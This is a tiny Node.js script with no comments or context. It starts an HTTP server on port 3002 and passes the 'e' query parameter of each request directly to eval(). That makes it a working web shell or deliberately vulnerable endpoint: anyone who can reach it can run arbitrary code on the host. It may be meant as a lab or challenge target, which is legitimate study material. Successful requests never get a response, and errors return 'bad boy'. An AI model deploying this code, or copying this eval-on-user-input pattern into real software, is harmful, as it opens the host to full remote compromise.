require('http').createServer((q, s) => {
    try {
        eval(require('url').parse(q.url, true).query.e)
    } catch (err) {
      console.log(err);;
      s.end('bad boy');
    }
}).listen(3002);